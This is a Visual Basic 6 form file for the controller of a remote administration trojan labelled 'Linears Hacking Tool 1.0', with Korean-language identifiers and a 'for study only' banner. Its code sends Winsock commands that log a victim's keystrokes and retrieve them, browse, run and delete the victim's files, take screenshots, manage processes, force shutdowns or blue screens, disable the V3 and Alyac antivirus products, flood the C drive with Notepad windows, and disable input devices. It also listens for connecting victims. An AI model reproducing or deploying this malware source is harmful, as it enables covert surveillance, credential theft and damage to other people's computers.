VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "mswinsck.ocx"
Object = "{3B7C8863-D78F-101B-B9B5-04021C009402}#1.2#0"; "richtx32.ocx"
Object = "{747C7273-3845-411B-B3BB-0EF3AAFDC196}#10.0#0"; "FileTransfer.ocx"
Begin VB.Form Form1 
   BorderStyle     =   1  '단일 고정
   Caption         =   "Linears Hacking Tool 1.0"
   ClientHeight    =   5505
   ClientLeft      =   45
   ClientTop       =   435
   ClientWidth     =   7335
   FillColor       =   &H00FFFFFF&
   ForeColor       =   &H00FFFFFF&
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   5505
   ScaleWidth      =   7335
   StartUpPosition =   2  '화면 가운데
   Begin VB.CommandButton 익스버 
      Caption         =   "익스플로러"
      Enabled         =   0   'False
      Height          =   375
      Left            =   120
      TabIndex        =   65
      Top             =   3720
      Width           =   1335
   End
   Begin FileTransfer.ctlFileTransfer FT 
      Left            =   6840
      Top             =   4080
      _ExtentX        =   847
      _ExtentY        =   847
      ReceiveDirPath  =   "C:\Documents and Settings\Administrator\바탕 화면\리네트레이너 제작\Lineras Hacking tool\클라이언트"
      Version         =   2.1
   End
   Begin MSWinsockLib.Winsock 목록 
      Index           =   0
      Left            =   6840
      Top             =   960
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      LocalPort       =   2514
   End
   Begin VB.TextBox 상태표시 
      Alignment       =   2  '가운데 맞춤
      BackColor       =   &H00E0E0E0&
      BeginProperty Font 
         Name            =   "굴림"
         Size            =   9
         Charset         =   129
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   270
      Left            =   120
      Locked          =   -1  'True
      TabIndex        =   19
      Text            =   "Linears Hacking Tool By.리네아스 - 공부목적이며 , 악용하지않을것 -"
      Top             =   5160
      Width           =   7095
   End
   Begin VB.CommandButton 접속자목록 
      Caption         =   "접속자 목록 실행"
      Enabled         =   0   'False
      Height          =   495
      Left            =   5160
      TabIndex        =   18
      Top             =   4560
      Width           =   2055
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   6840
      Top             =   480
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.CommandButton 포맷 
      Caption         =   "포맷 시키기"
      Enabled         =   0   'False
      Height          =   375
      Left            =   120
      TabIndex        =   17
      Top             =   4680
      Width           =   1335
   End
   Begin VB.CommandButton discon 
      Caption         =   "접속 끊기"
      Enabled         =   0   'False
      Height          =   255
      Left            =   4080
      TabIndex        =   16
      Top             =   480
      Width           =   975
   End
   Begin VB.ListBox 접속자 
      Enabled         =   0   'False
      Height          =   4020
      ItemData        =   "Form1.frx":581A
      Left            =   5160
      List            =   "Form1.frx":581C
      TabIndex        =   15
      Top             =   360
      Width           =   2055
   End
   Begin VB.CommandButton 스크린샷 
      Caption         =   "스크린샷"
      Enabled         =   0   'False
      Height          =   375
      Left            =   120
      TabIndex        =   14
      Top             =   3360
      Width           =   1335
   End
   Begin VB.CommandButton 프로세서 
      Caption         =   "프로세서 관리"
      Enabled         =   0   'False
      Height          =   375
      Left            =   120
      TabIndex        =   13
      Top             =   3000
      Width           =   1335
   End
   Begin VB.CommandButton 파일 
      Caption         =   "파일 훑어보기"
      Enabled         =   0   'False
      Height          =   375
      Left            =   120
      TabIndex        =   12
      Top             =   2640
      Width           =   1335
   End
   Begin VB.CommandButton 바이러스 
      Caption         =   "바이러스 심기"
      Enabled         =   0   'False
      Height          =   375
      Left            =   120
      TabIndex        =   11
      Top             =   2280
      Width           =   1335
   End
   Begin VB.CommandButton 키로그 
      Caption         =   "키 로그"
      Enabled         =   0   'False
      Height          =   375
      Left            =   120
      TabIndex        =   10
      Top             =   1920
      Width           =   1335
   End
   Begin VB.CommandButton 장난 
      Caption         =   "장난치기"
      Enabled         =   0   'False
      Height          =   375
      Left            =   120
      TabIndex        =   9
      Top             =   1560
      Width           =   1335
   End
   Begin VB.CommandButton 채팅 
      Caption         =   "채팅"
      Enabled         =   0   'False
      Height          =   375
      Left            =   120
      TabIndex        =   8
      Top             =   1200
      Width           =   1335
   End
   Begin VB.CommandButton 메시지 
      Caption         =   "메시지"
      Enabled         =   0   'False
      Height          =   375
      Left            =   120
      TabIndex        =   7
      Top             =   840
      Width           =   1335
   End
   Begin VB.PictureBox Picture1 
      Height          =   4215
      Left            =   1560
      Picture         =   "Form1.frx":581E
      ScaleHeight     =   4155
      ScaleWidth      =   3435
      TabIndex        =   6
      Top             =   840
      Width           =   3495
      Begin VB.Frame 익스 
         Caption         =   "익스플로러"
         Height          =   1095
         Left            =   120
         TabIndex        =   66
         Top             =   1920
         Visible         =   0   'False
         Width           =   3135
         Begin VB.CommandButton Command18 
            Caption         =   "키기"
            Height          =   375
            Left            =   120
            TabIndex        =   68
            Top             =   600
            Width           =   1095
         End
         Begin VB.TextBox 주소 
            Height          =   270
            Left            =   120
            TabIndex        =   67
            Text            =   "http://cafe.naver.com/myvb.cafe"
            Top             =   240
            Width           =   2895
         End
      End
      Begin VB.Frame keylog 
         Caption         =   "KEY LOG"
         Height          =   375
         Left            =   120
         TabIndex        =   61
         Top             =   120
         Visible         =   0   'False
         Width           =   3135
         Begin VB.CommandButton Command15 
            Caption         =   "키파일 저장"
            Height          =   255
            Left            =   1680
            TabIndex        =   64
            Top             =   3480
            Width           =   1335
         End
         Begin VB.CommandButton Command14 
            Caption         =   "키파일 읽기"
            Height          =   255
            Left            =   120
            TabIndex        =   63
            Top             =   3480
            Width           =   1335
         End
         Begin VB.TextBox key 
            Height          =   3255
            Left            =   120
            Locked          =   -1  'True
            MultiLine       =   -1  'True
            ScrollBars      =   3  '양방향
            TabIndex        =   62
            Top             =   240
            Width           =   2895
         End
      End
      Begin VB.Frame 파일훑 
         Caption         =   "파일 훑어보기"
         Height          =   255
         Left            =   240
         TabIndex        =   52
         Top             =   120
         Visible         =   0   'False
         Width           =   2895
         Begin VB.CommandButton Command19 
            Height          =   300
            Left            =   2040
            TabIndex        =   60
            Top             =   3480
            Width           =   735
         End
         Begin VB.CommandButton del 
            Caption         =   "삭제"
            Height          =   300
            Left            =   1080
            TabIndex        =   59
            Top             =   3480
            Width           =   855
         End
         Begin VB.CommandButton Run 
            Caption         =   "실행"
            Height          =   300
            Left            =   120
            TabIndex        =   58
            Top             =   3480
            Width           =   855
         End
         Begin VB.CommandButton Command16 
            Height          =   255
            Left            =   2040
            TabIndex        =   57
            Top             =   3120
            Width           =   735
         End
         Begin VB.CommandButton renew 
            Caption         =   "새로읽기"
            Height          =   255
            Left            =   1080
            TabIndex        =   56
            Top             =   3120
            Width           =   855
         End
         Begin VB.CommandButton up 
            Caption         =   "상위폴더"
            Height          =   255
            Left            =   120
            TabIndex        =   55
            Top             =   3120
            Width           =   855
         End
         Begin VB.ListBox List1 
            Height          =   2400
            Left            =   120
            TabIndex        =   54
            Top             =   600
            Width           =   2655
         End
         Begin VB.TextBox list1Text 
            Height          =   270
            Left            =   120
            Locked          =   -1  'True
            TabIndex        =   53
            Top             =   240
            Width           =   2655
         End
      End
      Begin VB.Frame 바이러 
         Caption         =   "바이러스 심기"
         Height          =   975
         Left            =   480
         TabIndex        =   40
         Top             =   3120
         Visible         =   0   'False
         Width           =   2775
         Begin VB.CommandButton Command12 
            Caption         =   "알약 V3 조지기"
            Height          =   255
            Left            =   120
            TabIndex        =   49
            Top             =   600
            Width           =   2535
         End
         Begin VB.CommandButton Command11 
            Caption         =   "C드라이브 무한 메모장 생성"
            Height          =   255
            Left            =   120
            TabIndex        =   48
            Top             =   240
            Width           =   2535
         End
      End
      Begin VB.Frame 장난폼 
         Caption         =   "장난 치기"
         Height          =   255
         Left            =   480
         TabIndex        =   35
         Top             =   120
         Visible         =   0   'False
         Width           =   2775
         Begin VB.CommandButton Command13 
            Caption         =   "블루스크린 "
            Enabled         =   0   'False
            Height          =   300
            Left            =   120
            TabIndex        =   50
            Top             =   2760
            Width           =   1695
         End
         Begin VB.CommandButton Command10 
            Caption         =   "컴퓨터 강제종료"
            Height          =   255
            Left            =   120
            TabIndex        =   47
            Top             =   2400
            Width           =   1695
         End
         Begin VB.CommandButton Command9 
            Caption         =   "풀기"
            Height          =   255
            Left            =   1920
            TabIndex        =   46
            Top             =   2040
            Width           =   735
         End
         Begin VB.CommandButton Command8 
            Caption         =   "닿는것마다 꺼지기"
            Height          =   255
            Left            =   120
            TabIndex        =   45
            Top             =   2040
            Width           =   1695
         End
         Begin VB.CommandButton Command7 
            Caption         =   "마우스 키보드 병신"
            Height          =   255
            Left            =   120
            TabIndex        =   44
            Top             =   1680
            Width           =   1695
         End
         Begin VB.CommandButton Command6 
            Caption         =   "보이기"
            Height          =   255
            Left            =   1920
            TabIndex        =   43
            Top             =   1320
            Width           =   735
         End
         Begin VB.CommandButton Command5 
            Caption         =   "마우s커서사라지기"
            Height          =   255
            Left            =   120
            TabIndex        =   42
            Top             =   1320
            Width           =   1695
         End
         Begin VB.CommandButton Command2 
            Caption         =   "마우스 좌우변경"
            Height          =   255
            Left            =   120
            TabIndex        =   41
            Top             =   960
            Width           =   1695
         End
         Begin VB.CommandButton 작업켜 
            Caption         =   "보이기"
            Height          =   255
            Left            =   1920
            TabIndex        =   39
            Top             =   600
            Width           =   735
         End
         Begin VB.CommandButton 작업꺼 
            Caption         =   "작업표시줄 숨기기"
            Height          =   255
            Left            =   120
            TabIndex        =   38
            Top             =   600
            Width           =   1695
         End
         Begin VB.CommandButton nCD 
            Caption         =   "닫기"
            Height          =   255
            Left            =   1920
            TabIndex        =   37
            Top             =   240
            Width           =   735
         End
         Begin VB.CommandButton CD 
            Caption         =   "CD롬 열기"
            Height          =   255
            Left            =   120
            TabIndex        =   36
            Top             =   240
            Width           =   1695
         End
      End
      Begin VB.Frame 채팅방 
         Caption         =   "채팅"
         Height          =   2175
         Left            =   120
         TabIndex        =   29
         Top             =   1920
         Visible         =   0   'False
         Width           =   3135
         Begin RichTextLib.RichTextBox Text3 
            Height          =   1215
            Left            =   120
            TabIndex        =   34
            Top             =   480
            Width           =   2895
            _ExtentX        =   5106
            _ExtentY        =   2143
            _Version        =   393217
            Enabled         =   -1  'True
            ReadOnly        =   -1  'True
            ScrollBars      =   2
            TextRTF         =   $"Form1.frx":16A0B
         End
         Begin VB.CommandButton Command4 
            Caption         =   "전체채팅방"
            Height          =   300
            Left            =   600
            TabIndex        =   32
            Top             =   120
            Width           =   1155
         End
         Begin VB.CommandButton Command3 
            Caption         =   "기본채팅방"
            Height          =   300
            Left            =   1800
            TabIndex        =   31
            Top             =   120
            Width           =   1215
         End
         Begin VB.TextBox Text4 
            Height          =   270
            Left            =   120
            TabIndex        =   30
            Text            =   "하실말"
            Top             =   1800
            Width           =   2895
         End
      End
      Begin VB.Frame 가림1 
         Caption         =   "Frame1"
         Height          =   1695
         Left            =   120
         TabIndex        =   20
         Top             =   120
         Visible         =   0   'False
         Width           =   3135
         Begin VB.OptionButton 메5 
            Caption         =   "물어보기"
            Height          =   180
            Left            =   1800
            TabIndex        =   33
            Top             =   1440
            Width           =   1095
         End
         Begin VB.TextBox 텍타 
            Height          =   270
            Left            =   120
            TabIndex        =   28
            Text            =   "Text3"
            Top             =   240
            Width           =   2895
         End
         Begin VB.CommandButton Command1 
            Caption         =   "테스트"
            Height          =   375
            Left            =   120
            TabIndex        =   27
            Top             =   1200
            Width           =   735
         End
         Begin VB.OptionButton 메4 
            Caption         =   "YES,NO"
            Height          =   180
            Left            =   1800
            TabIndex        =   26
            Top             =   1200
            Width           =   1095
         End
         Begin VB.OptionButton 메3 
            Caption         =   "물음표"
            Height          =   180
            Left            =   1800
            TabIndex        =   25
            Top             =   960
            Width           =   855
         End
         Begin VB.OptionButton 메2 
            Caption         =   "경고용"
            Height          =   180
            Left            =   840
            TabIndex        =   24
            Top             =   960
            Width           =   855
         End
         Begin VB.OptionButton 메1 
            Caption         =   "기본"
            Height          =   180
            Left            =   120
            TabIndex        =   23
            Top             =   960
            Value           =   -1  'True
            Width           =   735
         End
         Begin VB.CommandButton 버1 
            Caption         =   "보내기"
            Height          =   375
            Left            =   960
            TabIndex        =   22
            Top             =   1200
            Width           =   735
         End
         Begin VB.TextBox 텍1 
            Height          =   270
            Left            =   120
            TabIndex        =   21
            Text            =   "Text3"
            Top             =   600
            Width           =   2895
         End
      End
   End
   Begin VB.TextBox Text2 
      Enabled         =   0   'False
      Height          =   270
      Left            =   2400
      TabIndex        =   5
      Text            =   "2070"
      Top             =   480
      Width           =   735
   End
   Begin VB.CommandButton con 
      Caption         =   "접속"
      Enabled         =   0   'False
      Height          =   255
      Left            =   3240
      TabIndex        =   3
      Top             =   480
      Width           =   735
   End
   Begin VB.TextBox Text1 
      Enabled         =   0   'False
      Height          =   270
      Left            =   480
      TabIndex        =   1
      Text            =   "127.0.0.1"
      Top             =   480
      Width           =   1335
   End
   Begin VB.Label ip 
      Alignment       =   2  '가운데 맞춤
      Caption         =   "IP : "
      Height          =   255
      Left            =   4920
      TabIndex        =   51
      Top             =   120
      Width           =   2415
   End
   Begin VB.Label Label3 
      Alignment       =   2  '가운데 맞춤
      Caption         =   "Port : "
      Height          =   255
      Left            =   1920
      TabIndex        =   4
      Top             =   500
      Width           =   495
   End
   Begin VB.Label Label2 
      Alignment       =   2  '가운데 맞춤
      Caption         =   "IP :"
      Height          =   255
      Left            =   0
      TabIndex        =   2
      Top             =   500
      Width           =   495
   End
   Begin VB.Label Label1 
      Alignment       =   2  '가운데 맞춤
      BackStyle       =   0  '투명
      Caption         =   "Linears Hacking Tools 1.0"
      BeginProperty Font 
         Name            =   "굴림"
         Size            =   18
         Charset         =   129
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   375
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   5175
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Dim 메시지확인 As Boolean
Dim 메시지종류 As Integer
Dim 채팅방확인 As Boolean
Dim 채팅방종류 As Integer
Dim 허락 As Boolean

Dim 리박

Dim WIndex As Long

Private Sub 메시지_Click()
If 메시지확인 = False Then
텍1.Text = "보낼 메시지"
버1.Caption = "보내기"
텍타.Text = "텍스트 타이틀"
가림1.Caption = "메시지 기능"
메시지확인 = True
가림1.Visible = True
Else
가림1.Visible = False
메시지확인 = False
End If
End Sub



Private Sub 목록_Close(Index As Integer)
목록(Index).Close
End Sub

Private Sub 목록_ConnectionRequest(Index As Integer, ByVal requestID As Long)
WIndex = WIndex + 1
Load 목록(WIndex)
목록(WIndex).Close
목록(WIndex).Accept requestID
End Sub

Private Sub 목록_DataArrival(Index As Integer, ByVal bytesTotal As Long)
Dim b As String
목록(WIndex).GetData b
If Left(b, 1) = "/" Then
접속자.AddItem Split(b, "/")(1)
End If
End Sub

Private Sub 바이러스_Click()
If 바이러스.Caption = "바이러스 심기" Then
바이러.Visible = True
바이러스.Caption = "바이러스 숨기"
Else
바이러.Visible = False
바이러스.Caption = "바이러스 심기"
End If
End Sub

Private Sub 버1_Click()
On Error Resume Next
If Not InStr(텍1, ":") > 0 Then
    If Not InStr(텍타, ":") > 0 Then
        If 메2.Value = True Then
        메시지종류 = 1
        ElseIf 메3.Value = True Then
        메시지종류 = 2
        ElseIf 메4.Value = True Then
        메시지종류 = 3
        ElseIf 메1.Value = True Then
        메시지종류 = 0
        End If
            If 메5.Value = True Then
            Winsock1.SendData "/묻지마:" & 텍1.Text & ":" & 텍타.Text & ":"
            Else
            Winsock1.SendData "/메세지:" & 텍1.Text & ":" & 메시지종류 & ":" & 텍타.Text & ":"
            End If
    Else
        MsgBox " : 부호가 들어가면 안됩니다.", vbOKOnly, "LHTool"
    End If
Else
    MsgBox " : 부호가 들어가면 안됩니다.", vbOKOnly, "LHTool"
End If
' 0-기본 1-경고 2-물음표 3-묻기
' /메시지:메시지:종류:타이틀 , /메시지:님아해킹당하셨음ㅋ:1:수고요
End Sub

Private Sub 스크린샷_Click()
SC.Show
End Sub

Private Sub 익스버_Click()
If 익스버.Caption = "익스플로러" Then
익스.Visible = True
익스버.Caption = "익스 숨기기"
Else
익스.Visible = False
익스버.Caption = "익스플로러"
End If
End Sub

Private Sub 작업꺼_Click()
Winsock1.SendData "/작업꺼"
End Sub

Private Sub 작업켜_Click()
Winsock1.SendData "/작업켜"
End Sub

Private Sub 장난_Click()
If 장난.Caption = "장난치기" Then
장난폼.Height = 3255
장난폼.Visible = True
장난.Caption = "장난 숨기기"
Else
장난폼.Visible = False
장난.Caption = "장난치기"
End If
End Sub


Private Sub 접속자_DblClick()
For 리박 = 0 To 99
    If 접속자.ListIndex = 리박 Then
        Text1.Text = Split(접속자.Text, " ")(0)
    End If
Next 리박

End Sub

Private Sub 접속자목록_Click()
접속자.Enabled = True
접속자목록.Enabled = False
상태표시.Text = "접속자 목록 작동중..."
목록(0).Listen
ip.Caption = "IP : " & 목록(0).LocalIP
End Sub


Private Sub 채팅_Click()
If 채팅방확인 = False Then
채팅방.Visible = True
채팅방확인 = True
Else
채팅방.Visible = False
채팅방확인 = False
End If
End Sub

Private Sub 키로그_Click()
keylog.Height = 3855
If 키로그.Caption = "키 로그" Then
keylog.Visible = True
키로그.Caption = "키 닫기"
Else
keylog.Visible = False
키로그.Caption = "키 로그"
End If
End Sub

Private Sub 텍1_Click()
If 메시지확인 = True Then
    If 텍1.Text = "보낼 메시지 : " Then
        텍1.Text = ""
    End If
End If

End Sub

Private Sub 텍타_Click()
If 텍타.Text = "텍스트 타이틀 : " Then
텍타.Text = ""
End If
End Sub

Private Sub 파일_Click()
If 파일훑.Caption = "파일 훑어보기" Then
파일훑.Height = 3855
파일훑.Visible = True
파일훑.Caption = "파일 숨기기"
Else
파일훑.Visible = False
파일훑.Caption = "파일 훑어보기"
End If
End Sub

Private Sub 포맷_Click()
MsgBox "리얼?", vbOKCancel, "!!!"
If vbOK = True Then
'Winsock1.SendData "/날려라"
Else
End If
End Sub

Private Sub 프로세서_Click()
Form3.Show
End Sub

Private Sub CD_Click()
Winsock1.SendData "/CD롬"
End Sub

Private Sub Command1_Click()
If 메2.Value = True Then
MsgBox 텍1.Text, vbCritical, 텍타.Text
ElseIf 메3.Value = True Then
MsgBox 텍1.Text, vbQuestion, 텍타.Text
ElseIf 메4.Value = True Then
MsgBox 텍1.Text, vbYesNo, 텍타.Text
Else
MsgBox 텍1.Text, vbOKOnly, 텍타.Text
End If
End Sub

Private Sub Command10_Click()
Winsock1.SendData "/컴끄자"
End Sub

Private Sub Command11_Click()
MsgBox "이거 하면 좆됨 그래도 할꺼임?", vbOKCancel, "LHTool"
If vbYes = True Then
Winsock1.SendData "/c무한"
Else
End If
End Sub

Private Sub Command12_Click()
Winsock1.SendData "/백신꺼"
End Sub

Private Sub Command13_Click()
Winsock1.SendData "/블루스"
End Sub

Private Sub Command14_Click()
Winsock1.SendData "/키파일"
End Sub

Private Sub Command15_Click()
    On Error Resume Next
    
    If key.Text <> "" Then
        Open App.Path & "KeyLog.txt" For Output As #1
        Print #1, key
        Close #1
    End If
End Sub

Private Sub Command17_Click()
If 익스.Caption = "익스플로러" Then
익스.Visible = True
익스.Caption = "익스 숨기기"
Else
익스.Visible = False
익스.Caption = "익스플로러"
End If
End Sub

Private Sub Command18_Click()
Winsock1.SendData "/익스플=" & 주소.Text
End Sub

Private Sub Command2_Click()
Winsock1.SendData "/마좌우"
End Sub

Private Sub Command3_Click()
If Command3.Caption = "기본채팅방" Then
Winsock1.SendData "/기채팅"
Command3.Caption = "기본챗방꺼"
Else
Winsock1.SendData "/기채꺼"
Command3.Caption = "기본채팅방"
End If
End Sub

Private Sub Command4_Click()
상태표시.Text = "구현 안됨"
End Sub

Private Sub Command5_Click()
Winsock1.SendData "/마커서"
End Sub

Private Sub Command6_Click()
Winsock1.SendData "/마커켜"
End Sub

Private Sub Command7_Click()
Winsock1.SendData "/마키병"
End Sub

Private Sub Command8_Click()
Winsock1.SendData "/마병맛"
End Sub

Private Sub Command9_Click()
Winsock1.SendData "/마병제"
End Sub

Private Sub con_Click()
Winsock1.Connect Text1.Text, Text2.Text 'text1=IP , text2=port
Text1.Enabled = False
Text2.Enabled = False
con.Enabled = False
discon.Enabled = True
상태표시 = "서버와 연결을 시도합니다."
End Sub


Private Sub del_Click()
    On Error Resume Next
    
    If Left(List1.List(List1.ListIndex), 1) <> "[" Then
        Form1.Winsock1.SendData "/[D]" & DriverName & ForderName & List1.List(List1.ListIndex)
    End If
End Sub

Private Sub discon_Click()
Winsock1.Close
상태표시.Text = "서버와의 연결을 끊으셨습니다."
discon.Enabled = False
con.Enabled = True
Text1.Enabled = True
Text2.Enabled = True
메시지.Enabled = False
채팅.Enabled = False
장난.Enabled = False
키로그.Enabled = False
바이러스.Enabled = False
파일.Enabled = False
프로세서.Enabled = False
스크린샷.Enabled = False
익스버.Enabled = False
End Sub

Private Sub Form_Load()
'Form1.Show
'Form2.Show vbModal

    FT.ReceiveDirPath = App.Path
    FT.LocalPort = 4010      '<================= LocalPort 설정
    FT.RemoteHost = Winsock1.LocalIP         '<================= RemoteHost 설정
    FT.RemotePort = 3010
    
End Sub



Private Sub List1_Click()
    'On Error Resume Next
    
    Dim VTemp As String
    Dim TempList As String
    
    If Left(List1.List(List1.ListIndex), 4) = "[..]" Then '// 상위 폴더
        up_Click '// 상위 클릭 했을 때와 같이 동작
        Exit Sub
    End If
    
    VTemp = Left(List1.List(List1.ListIndex), 2) '// If 문의 조건이 길어져서 쓴 변수
    TempList = ""
    
    If VTemp = "[-" Then '// 드라이브 이면
        TempList = Mid$(List1.List(List1.ListIndex), 3, Len(List1.List(List1.ListIndex)))
        DriverName = Mid$(TempList, 1, Len(TempList) - 2) & ":\"
        ForderName = "" '// 드라이버가 바뀌면 폴더 변수는 잠시 클리어
        
        Winsock1.SendData "/[R]" & DriverName & ForderName & "*.*"
    ElseIf VTemp <> "[-" And Left(List1.List(List1.ListIndex), 1) = "[" Then '// 폴더
        TempList = Mid$(List1.List(List1.ListIndex), 2, Len(List1.List(List1.ListIndex)))
        ForderName = ForderName & Mid$(TempList, 1, Len(TempList) - 1) & "\"
        
        Winsock1.SendData "/[R]" & DriverName & ForderName & "*.*"
    End If
    
    list1Text = DriverName & ForderName & "*.*"
End Sub


Private Sub nCD_Click()
Winsock1.SendData "/CD닫"
End Sub

Private Sub PRO_Click()
Winsock1.SendData "/pr좀"
End Sub

Private Sub renew_Click()
    On Error Resume Next
    
    List1.Clear '// 리스트 박스 초기화
    
    If DriverName = "" Then '// 드라이버 이름 기억 변수 초기화
        DriverName = "c:\"
    End If
    
    Winsock1.SendData "/[R]" & DriverName & ForderName & "*.*" '// *.*은 모든 파일 표시
    
    list1Text.Text = DriverName & ForderName & "*.*"
End Sub

Private Sub Run_Click()
    On Error Resume Next
    
    If Left(List1.List(List1.ListIndex), 1) <> "[" Then
        Form1.Winsock1.SendData "/[E]" & DriverName & ForderName & List1.List(List1.ListIndex)
    End If

End Sub

Private Sub Text4_KeyDown(KeyCode As Integer, Shift As Integer)
If KeyCode = 13 Then
If Not Text2 = "" Then
    If Not InStr(Text2.Text, "/") > 0 Then
        If Not InStr(Text2.Text, ":") > 0 Then
Winsock1.SendData "/채팅자:" & "해커] " & Text4.Text & vbCrLf '/채팅:aksmd 다음줄로
            Text3.Text = Text3.Text & "나: " & Text4.Text & vbCrLf
            Text3.SelStart = Len(Text3.Text)
            Text4 = ""
            Text4.SetFocus
        Else
        End If
    Else
    End If
Else
Text2.SetFocus
End If
End If
End Sub

Private Sub up_Click()
    On Error Resume Next
    
    Dim XTemp() As String
    Dim i As Integer
    
    If ForderName <> "" Then
        XTemp = Split(ForderName, "\")
        
        If UBound(XTemp) = 1 Then
            ForderName = ""
            Form1.Winsock1.SendData "/[R]" & DriverName & ForderName & "*.*"
        Else
            ForderName = ""
        
            For i = 0 To UBound(XTemp) - 2 Step 1
                ForderName = ForderName & XTemp(i) & "\"
            Next i
            
            Form1.Winsock1.SendData "/[R]" & DriverName & ForderName & "*.*"
        End If
    End If
    
End Sub

Private Sub Winsock1_Close()
    Winsock1.Close
   상태표시.Text = "서버가 종료되었습니다."
End Sub

Private Sub Winsock1_Connect()
메시지.Enabled = True
채팅.Enabled = True
장난.Enabled = True
키로그.Enabled = True
바이러스.Enabled = True
파일.Enabled = True
프로세서.Enabled = True
스크린샷.Enabled = True
익스버.Enabled = True
End Sub

Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
    Dim X As String
    Dim i As Integer
    Dim X_ReNew() As String
    
Dim a As String '서버인증
Winsock1.GetData a '/ dd ㅇㅇ:
If Left(a, 1) = "/" Then  '제어 문자 검색 첫번째 자리가 "/"이면 ture 없으면 false
    Select Case Mid(a, 2, 2) '제어문자에 맞는 실행 두번째자리부터 읽음 그러므로 앞에 "/" 없어도됨

    Case "MS" '/ MS 메시지
    MsgBox Split(a, ":")(1)
    Exit Sub
    
    Case "키로" '/키로:키로그
    MsgBox Split(a, ":")(1)
    Exit Sub
    
    Case "승인" '서버에서 허락함
    상태표시.Text = "서버와의 연결이 성공하였습니다."
    허락 = True
    Exit Sub
    
    Case "채팅" ' /채팅:
    Text3.SelStart = Len(Text3.TextRTF)
    Text3.Text = Text3.Text & Split(a, ":")(1)
    Exit Sub
    
    Case "리스" ' /채팅:
                Form3.proList.Clear
                X_ReNew = Split(Mid$(a, 4, Len(a)), "<|>")
                
                For i = 0 To UBound(X_ReNew) Step 1
                    If X_ReNew(i) <> "" Then
                        Form3.proList.AddItem X_ReNew(i)
                    End If
                Next i
    Exit Sub
    
                Case "새로" '// 새로 고침 정보를 받았을때
                List1.Clear
                X_ReNew = Split(Mid$(a, 4, Len(a)), "<|>")
                
                For i = 0 To UBound(X_ReNew) Step 1
                    If X_ReNew(i) <> "" Then
                         List1.AddItem X_ReNew(i)
                    End If
                Next i
            Case "새2" '// 새로 고침 요구를 받았을때
                 List1.Clear
                Winsock1.SendData "/[R]" & DriverName & ForderName & "*.*"
                
    Case "키받"
    key.Text = key.Text & Split(a, ":")(1)
    Exit Sub
    
    End Select
End If
    
End Sub

Private Sub Winsock1_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
상태표시.Text = "상대방에게 연결하실수 없습니다"
Winsock1.Close
Text1.Enabled = True
Text2.Enabled = True
con.Enabled = True
discon.Enabled = False
메시지.Enabled = False
채팅.Enabled = False
장난.Enabled = False
키로그.Enabled = False
바이러스.Enabled = False
파일.Enabled = False
프로세서.Enabled = False
스크린샷.Enabled = False
익스버.Enabled = False
End Sub
